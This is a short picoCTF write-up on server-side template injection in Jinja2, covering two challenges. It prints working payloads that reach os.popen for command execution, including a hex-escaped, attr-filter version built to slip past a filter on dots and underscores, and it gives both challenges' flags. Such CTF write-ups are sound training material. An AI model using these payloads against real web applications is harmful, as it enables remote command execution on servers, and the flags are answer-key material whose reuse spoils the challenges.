---
title: ' SSTI - PICOCTF challeng'
tags: [CTF]

---

---
title: SSTI - PICOCTF challenges
description: Server-Side Template Injection
tags: CTF,Web, SSTI, PortSwigger-2024
robots: index, follow
lang: en
breaks: true
---

# SSTI - picoCTF

[TOC]

## how it works










![Screenshot 2025-10-18 211441](https://hackmd.io/_uploads/Hy6Xbm-Cxe.png)

as you can see, when we access the web page(home), it asking for user input for web interface and it will print the same value or str if we type anything
## The solution

This one too popular for knowing of SSTI injection by adding some syntax for math operators for detect the server-side template

We will the following exp in this roadmap:

![images](https://hackmd.io/_uploads/BJ9BzXZAge.png)
When testing all of these we figure that it use the jinja2 template

So we will use this line of command for breaking the template
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
now we can see the id and root of the web, so now we just change the id ==> ls and find the `flag` file ==> `cat flag`

---
**flag**: here is the flag `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}`


# SSTI2


## The problem

this challenges is quite similar to the 1st but there is some thing differnce how we can break the template of server-side.
It say that it ` I read about input sanitization, so now I remove any kind of characters that could be a problem ` this it will check whether there is a `.` or `_` of the cmd and here is the result










![Screenshot 2025-10-18 213228](https://hackmd.io/_uploads/S10MSQ-0lg.png)




so we must try something else


## the solution

We will try to using the hex decode all the special character.
for exp like for `_` ==> `\x5f\x5f` and `.` ==> 
`attr` or `[]` ==> `|`
and here is the final command
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`

doing the same like the previous one 

---
**flag**: Here is your flag: `picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}`

**author**:minhkhoav47@gmail.com













